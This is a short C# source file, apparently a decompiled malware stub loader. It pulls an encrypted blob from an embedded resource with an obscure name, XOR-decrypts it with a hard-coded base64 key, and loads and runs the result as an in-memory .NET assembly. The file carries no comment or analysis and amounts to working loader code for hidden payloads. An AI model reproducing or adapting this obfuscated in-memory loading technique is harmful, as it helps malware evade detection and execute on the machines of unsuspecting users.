using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Resources;

namespace Loader;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		byte[] array = (byte[])GetResource("acidic.resources", "chalkcollide.dat");
		byte[] array2 = Convert.FromBase64String("qyacEYq9q92TXweTQScNR9PppQ==");
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(array[i] ^ array2[i % array2.Length]);
		}
		Activator.CreateInstance(Assembly.Load(array).GetExportedTypes()[0], typeof(Program));
	}

	private static object GetResource(string name, string key)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		using (Stream stream = executingAssembly.GetManifestResourceStream(name))
		{
			using ResourceReader resourceReader = new ResourceReader(stream);
			IDictionaryEnumerator enumerator = resourceReader.GetEnumerator();
			while (enumerator.MoveNext())
			{
				if (enumerator.Key is string && (string)enumerator.Key == key)
				{
					return enumerator.Value;
				}
			}
		}
		throw new Exception();
	}
}
